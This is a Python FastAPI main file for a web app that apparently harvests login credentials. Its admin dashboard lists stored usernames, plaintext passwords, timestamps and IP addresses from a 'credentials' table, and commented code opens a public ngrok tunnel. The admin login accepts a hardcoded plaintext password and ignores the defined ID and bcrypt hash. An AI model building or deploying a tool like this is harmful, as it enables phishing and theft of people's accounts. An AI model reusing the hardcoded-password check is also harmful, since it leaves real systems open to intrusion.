#Main.py 


from fastapi import FastAPI, Request, Form, status
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from app.routes import login
from app.routes import admin
from dotenv import load_dotenv
from app.db.database import init_db  # <--- Add this
from fastapi.responses import RedirectResponse
from starlette.middleware.sessions import SessionMiddleware
from fastapi.responses import HTMLResponse
import sqlite3
import os
import uvicorn

#if you intend using pyngrok for public hosting, then uncomment line 14-16.

#from pyngrok import ngrok #Set up a tunnel to the app on port 8000
#public_url = ngrok.connect(8000)
#print("Public URL:", public_url)

# Start the FastAPI server
if __name__ == "__main__":
    uvicorn.run("app.main:app", host="127.0.0.1", port=8000, reload=True)


app = FastAPI()

# Mount static and templates
app.mount("/static", StaticFiles(directory="app/static"), name="static")
templates = Jinja2Templates(directory="app/templates")


ADMIN_ID = "731666"
HASHED_PASSWORD = b"$2b$12$wXFflsHrWcRBfLEQhyV9PO1VQAMKrAcRbEphA99lWulQXBg5y5zwK"

load_dotenv()
app.add_middleware(SessionMiddleware, secret_key=os.getenv("SECRET_KEY"))


# Initialize the database
init_db()  # <--- Run this when the app starts

# Include the routers
app.include_router(login.router)
app.include_router(admin.router) 


@app.get("/")
async def root_redirect():
   return RedirectResponse(url="/login")


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))

@app.get("/admin/login", response_class=HTMLResponse)
async def admin_login_form(request: Request):
    return templates.TemplateResponse("admin_login.html", {"request": request})

@app.post("/admin/login")
async def admin_login(request: Request, admin_id: str = Form(...), password: str = Form(...)):
    if password == "AdminPass001@":
        request.session["is_admin"] = True
        return RedirectResponse(url="/admin/dashboard", status_code=status.HTTP_302_FOUND)
    return templates.TemplateResponse("admin_login.html", {"request": request, "error": "Invalid password"})
    

@app.get("/admin/dashboard", response_class=HTMLResponse)
async def admin_dashboard(request: Request):
    if not request.session.get("is_admin"):
        return RedirectResponse(url="/admin/login")

    db_path = os.path.join(os.path.dirname(__file__), "db", "credentials.db")
    print("USING DB PATH:", db_path)  # ✅ Print for debugging

    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT id, username, password, timestamp, ip_address FROM credentials")
        records = cursor.fetchall()
        conn.close()
    except Exception as e:
        print("ERROR READING DB:", e)
        records = []

    return templates.TemplateResponse("admin_dashboard.html", {
        "request": request,
        "records": records
    })
